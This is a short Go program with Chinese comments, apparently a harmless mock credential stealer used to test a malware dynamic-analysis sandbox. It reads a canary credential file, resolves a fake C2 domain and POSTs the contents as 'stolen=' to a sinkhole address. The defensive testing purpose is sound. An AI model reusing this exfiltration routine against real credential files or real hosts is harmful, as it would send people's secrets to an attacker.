//go:build windows

// mocktarget：**良性**诱饵，行为等价于窃密木马，用来在不引爆真样本的前提下验证 Linux 动态分析流水线。
// 它会：读取金丝雀凭证文件 -> DNS 查询假 C2 -> 向 sinkhole POST 回传令牌。全部可被 strace/tcpdump/sinkhole 捕获。
// GOOS=windows GOARCH=amd64；env: CANARY_FILE=金丝雀路径, SINK_ADDR=sinkhole ip:port, C2_HOST=假域名
package main

import (
	"fmt"
	"net"
	"os"
	"time"
)

func main() {
	cf := os.Getenv("CANARY_FILE")
	sink := os.Getenv("SINK_ADDR")
	c2 := os.Getenv("C2_HOST")
	if c2 == "" {
		c2 = "c2.mock-example.top"
	}
	token := "NO_TOKEN"
	if cf != "" {
		if b, err := os.ReadFile(cf); err == nil {
			token = string(b)
			fmt.Printf("[mock] 读取金丝雀凭证 %s (%d 字节)\n", cf, len(b))
		}
	}
	// 触发 DNS（暴露外链域名）
	_, _ = net.LookupHost(c2)
	if sink != "" {
		if c, err := net.DialTimeout("tcp", sink, 5*time.Second); err == nil {
			body := "stolen=" + token
			req := "POST /gate HTTP/1.1\r\nHost: " + c2 + "\r\nUser-Agent: MockStealer/1.0\r\nContent-Length: " +
				fmt.Sprint(len(body)) + "\r\n\r\n" + body
			c.Write([]byte(req))
			buf := make([]byte, 256)
			c.Read(buf)
			c.Close()
			fmt.Println("[mock] 已回传令牌到", sink)
		}
	}
}
